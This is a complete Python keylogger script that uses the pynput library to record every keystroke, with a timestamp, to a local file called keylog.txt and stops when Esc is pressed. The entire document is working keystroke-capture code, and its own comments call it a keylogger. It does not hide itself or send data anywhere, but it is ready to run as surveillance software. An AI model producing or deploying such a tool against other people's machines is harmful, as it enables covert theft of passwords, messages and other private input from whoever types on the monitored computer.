from pynput.keyboard import Key, Listener
import datetime

# Define the file where you want to save the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Get the current timestamp
        current_time = datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S")
        
        # Log the key being pressed along with the timestamp
        with open(log_file, "a") as f:
            f.write(f'{current_time} - Key pressed: {key.char}\n')
    except AttributeError:
        # Some keys, like special keys (e.g., 'Shift', 'Ctrl'), don't have a char attribute
        with open(log_file, "a") as f:
            f.write(f'{current_time} - Special key pressed: {key}\n')

def on_release(key):
    if key == Key.esc:
        # Stop the listener when 'Esc' key is pressed
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



